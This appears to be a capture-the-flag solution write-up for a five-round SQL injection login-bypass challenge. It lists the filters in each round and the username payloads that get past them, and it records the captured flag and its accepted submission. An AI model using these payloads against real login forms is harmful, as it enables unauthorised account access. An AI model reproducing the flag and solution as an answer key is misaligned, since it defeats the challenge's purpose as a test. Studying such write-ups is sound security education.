# Web Gauntlet (picoCTF 2020 Mini-Competition, Web Exploitation, Challenge 88)

5-round SQL injection login gauntlet. Each round adds more blocked tokens;
goal: log in as `admin` without valid credentials, then read `filter.php`
for the flag.

## Filters per round (from `filter.php`)

| Round | Blocked tokens |
|-------|----------------|
| 1 | `or` |
| 2 | `or and like = --` |
| 3 | `<space> or and = like > < --` |
| 4 | `+ admin` |
| 5 | `+ union` (space no longer blocked) |

Backend is SQLite (`sqlite` hint). The query is roughly
`SELECT ... WHERE user='<input>' AND pass='<input>'`.

## Payload chain (one persistent session, cookie jar required)

| Round | Username payload | Why it works |
|-------|------------------|--------------|
| 1 | `admin' -- -` | classic comment-out; only `or` filtered (case-sensitive substring, uppercase `OR` also possible) |
| 2 | `admin'/*` | `/*` comments out the rest; `--` is blocked so use C-style comment |
| 3 | `admin'/*` | space is blocked too, but `/*` needs no spaces around it |
| 4 | `admi'\|\|'n'/*` | `admin` literal blocked; rebuild via SQLite string concatenation `'\|\|'` |
| 5 | `admi'\|\|'n'/*` | same; `union` now blocked but unnecessary for auth bypass |

Password field: anything (`x`).

## Flag

After round 5, `GET /filter.php` highlights its own source, which ends with:

```
academy{y0u_m4d3_1t_ecb312a6}
```

## Solver

`scripts/solve_88_web_gauntlet.py <base-url>` — replays the 5 payloads with
a persistent cookie jar, then scrapes the flag from `filter.php`.

Submitted via `POST /api/submissions/` -> `{"correct": true}`.
